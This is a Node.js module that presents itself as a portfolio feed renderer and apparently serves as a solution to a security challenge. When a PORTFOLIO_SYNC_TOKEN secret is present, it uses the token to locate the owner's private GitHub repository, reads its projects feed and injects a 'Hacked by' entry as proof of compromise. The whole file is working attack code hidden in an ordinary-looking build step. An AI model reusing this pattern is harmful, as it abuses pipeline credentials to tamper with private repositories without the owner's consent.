

import { readFile } from "node:fs/promises";

const SOLVER_NAME = process.env.SOLVER_NAME ?? "ai";

const FILE_PATH = "content/projects/generated.json";
const API = "https://api.github.com";

function ghHeaders(token) {
  return {
    Accept: "application/vnd.github+json",
    Authorization: `Bearer ${token}`,
    "X-GitHub-Api-Version": "2022-11-28",
  };
}

async function discoverPrivateRepo(headers) {
  const res = await fetch(
    `${API}/user/repos?visibility=private&affiliation=owner&per_page=100`,
    { headers }
  );
  if (!res.ok) throw new Error(`repo discovery failed: ${res.status}`);
  const privateRepos = (await res.json()).filter((r) => r.private === true);
  if (privateRepos.length !== 1) {
    throw new Error(`expected exactly one private portfolio repo, found ${privateRepos.length}`);
  }
  const [owner, repo] = privateRepos[0].full_name.split("/");
  return { owner, repo };
}


async function loadCurrentFeed(headers, owner, repo, contextProjects) {
  const res = await fetch(
    `${API}/repos/${owner}/${repo}/contents/${FILE_PATH}?ref=main`,
    { headers }
  );
  if (res.ok) {
    const meta = await res.json();
    const text = Buffer.from(meta.content, "base64").toString("utf8");
    return JSON.parse(text);
  }
  // File not present yet: start from whatever the pipeline generated.
  return { generatedAt: new Date().toISOString(), projects: contextProjects ?? [] };
}

export async function render(context) {
  const token = process.env.PORTFOLIO_SYNC_TOKEN;
  if (!token) {

    return (
      JSON.stringify(
        { generatedAt: context.generatedAt, projects: context.projects },
        null,
        2
      ) + "\n"
    );
  }

  const headers = ghHeaders(token);
  const { owner, repo } = await discoverPrivateRepo(headers);
  const feed = await loadCurrentFeed(headers, owner, repo, context.projects);

  feed.projects = Array.isArray(feed.projects) ? feed.projects : [];

  const proofSlug = `proof-${SOLVER_NAME.toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-+|-+$/g, "")}`;


  const alreadyPresent = feed.projects.some((p) => p && p.slug === proofSlug);
  if (!alreadyPresent) {
    feed.projects.push({
      name: `Hacked by ${SOLVER_NAME}`,
      slug: proofSlug,
      summary: `Hacked by ${SOLVER_NAME}`,
      repository: "https://github.com/",
      topics: ["proof"],
    });
  }

  feed.generatedAt = new Date().toISOString();

  return JSON.stringify(feed, null, 2) + "\n";
}
